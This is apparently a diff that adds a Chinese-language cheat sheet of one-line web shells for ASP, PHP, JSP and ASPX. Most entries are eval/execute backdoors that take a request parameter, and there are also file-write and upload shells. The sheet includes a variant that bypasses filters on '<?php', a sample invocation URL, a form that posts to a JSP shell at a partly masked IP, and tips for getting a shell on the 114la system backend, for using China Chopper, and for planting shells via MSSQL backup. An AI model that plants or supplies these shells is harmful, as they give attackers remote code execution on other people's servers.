@@ -1,0 +1,159 @@
+asp一句话木马
+
+
+ 程序代码
+<%eval request("CrAcK8")%>
+
+
+ 程序代码
+<%execute request("CrAcK8")%>
+
+
+ 程序代码
+<%execute(request("CrAcK8"))%>
+
+
+ 程序代码
+<%execute request("CrAcK8")%><%'<% loop <%:%>
+
+
+ 程序代码
+<%'<% loop <%:%><%execute request("CrAcK8")%>
+
+
+ 程序代码
+<%execute request("CrAcK8")'<% loop <%:%>[code]
+[code]<script language=vbs runat=server>eval(request("CrAcK8"))</script>
+
+
+ 程序代码
+%><%Eval(Request(chr(35)))%><%
+
+
+ 程序代码
+<%eval request("CrAcK8")%>
+
+
+ 程序代码
+<%ExecuteGlobal request("CrAcK8")%>
+
+
+ 程序代码
+if Request("CrAcK8")<>"" then ExecuteGlobal request("CrAcK8") end if
+//容错代码
+
+ 程序代码
+<%@LANGUAGE="JAVASCRIPT" CODEPAGE="65001"%>
+<%
+var lcx = {'名字' : Request.form('#'), '性别' : eval, '年龄' : '18', '昵称' : '请叫我一声老大'};
+lcx.性别((lcx.名字)+'');
+%>
+
+
+//使用冰狐一句话客户端链接
+
+
+ 程序代码
+<%
+Set o = Server.CreateObject("ScriptControl")
+o.language = "vbscript"
+o.addcode(Request("SubCode")) '参数SubCode作为过程代码
+o.run "e",Server,Response,Request,Application,Session,Error '参数名e 调用之，同时压入6个基对象作为参数
+%>
+
+
+调用示例：
+
+ 程序代码
+http://localhost/tmp.asp?SubCode=sub%20e%28Server,Response,Request,Application,Session,Error%29%20eval%28request%28%22v%22%29%29%20end%20sub&v=response.write%28server.mappath%28%22tmp.asp%22%29%29
+
+
+
+php一句话
+
+
+ 程序代码
+<?php eval($_POST[CrAcK8])?>
+
+
+ 程序代码
+<?php @eval($_POST[CrAcK8])?>
+           //容错代码
+
+ 程序代码
+<?php assert($_POST[CrAcK8]);?>
+         //使用lanker一句话客户端的专家模式执行相关的php语句
+
+ 程序代码
+<?$_POST['sa']($_POST['CrAcK8']);?>
+
+
+ 程序代码
+<?$_POST['sa']($_POST['CrAcK8'],$_POST['sc'])?>
+
+
+ 程序代码
+<?php 
+@preg_replace("/[email]/e",$_POST['h'],"error"); 
+?>
+       //使用这个后,使用菜刀一句话客户端在配置连接的时候在"配置"一栏输入
+
+ 程序代码
+<O>h=@eval($_POST[c]);</O>
+
+
+
+ 程序代码
+<script language="php">@eval($_POST[CrAcK8])</script>
+//绕过<?限制的一句话
+
+
+
+JSP一句话
+
+
+ 程序代码
+<%
+if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("\\")+request.getParameter("f"))).write(request.getParameter("t").getBytes());
+%>
+
+
+提交客户端
+
+
+ 程序代码
+<form action="http://59.x.x.x:8080/scdc/bob.jsp?f=fuckjp.jsp" method="post">
+<textarea name=t cols=120 rows=10 width=45>your code</textarea><BR><center><br>
+<input type=submit value="提交">
+</form>
+
+
+
+ASPX一句话
+
+ 程序代码
+<%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>
+
+
+
+ 程序代码
+
+<%@ Page Language="Jscript" validateRequest="false" %><%Response.Write(eval(Request.Item["w"],"unsafe"));%>
+//Jscript的asp.net一句话
+
+
+ 程序代码
+<%if (Request.Files.Count!=0) { Request.Files[0].SaveAs(Server.MapPath(Request["f"])   ); }%>
+//C#的asp.net一句话
+
+
+ 程序代码
+<% If Request.Files.Count <> 0 Then Request.Files(0).SaveAs(Server.MapPath(Request("f")) ) %>
+VB的asp.net一句话
+
+第一:114la网址导航系统后台getwebshell,最新版本,已经禁止了直接输入<?php这样的代码
+所以可以试用<script language="php">...<script>来绕过
+
+第二,使用菜刀的附加数据功能可以出现很多转换.所以还是仔细阅读下菜刀的readme.txt,上面的代码来自LCX的博客
+
+第三,使用mssql备份一句话的时候,特别是asp.net和jsp,因为代码过长,所以,需要再代码前面和后面多加空格等垃圾字符保证代码完整性,这个跟备份bat到启动项一个原理.
